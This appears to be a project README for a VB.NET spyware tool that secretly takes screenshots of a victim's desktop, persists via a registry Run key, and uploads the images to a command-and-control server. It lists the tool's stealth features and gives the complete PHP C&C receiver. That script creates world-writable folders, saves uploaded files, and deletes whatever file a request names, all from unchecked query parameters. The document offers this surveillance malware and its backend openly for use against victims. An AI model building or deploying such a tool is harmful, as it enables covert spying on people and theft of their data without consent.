<p align="center">
  <img src="https://i.ibb.co/BTyz5jW/Screenshot-10.png">  
</p>
<p align="center">
<b> Silent Screenshot Capture | Post Exploitation Tool | VB.NET </b>
</p>
<p align="center">
 A simple payload to take the screenshot of victims desktop and upload it to the C&C.
</p>

## Features:

 - Persistent (Using Registry Run Key)
 - Works in background 
 - Less Code Less Bugs
 - Deletes the screenshot on after upload it to C&C
 - C&C server in base64 
 - Upload screenshots in organized way on C&C
 - No port forwarding needed! works with a single php file
 - [TODO] Machine Information 
 - [TODO] Encryption 
 - [TODO] Set interval remotely from C&C

## Installation & Usage:
-   Clone this repository.
- A webhosting i recommend [namecheap](https://www.namecheap.com/) 
- Goto your public_html folder and make new [PHP](https://en.wikipedia.org/wiki/PHP) file and put below code in it
```
<?php
$del = $_GET["dellog"];
$folder = $_GET["folder"];
mkdir($folder,0777);
$file = $_GET["path"];
if (!empty($_FILES["file"])){
move_uploaded_file($_FILES["file"]["tmp_name"],
      $file . "/" . $_FILES["file"]["name"]);
}
unlink($del);
?>
```
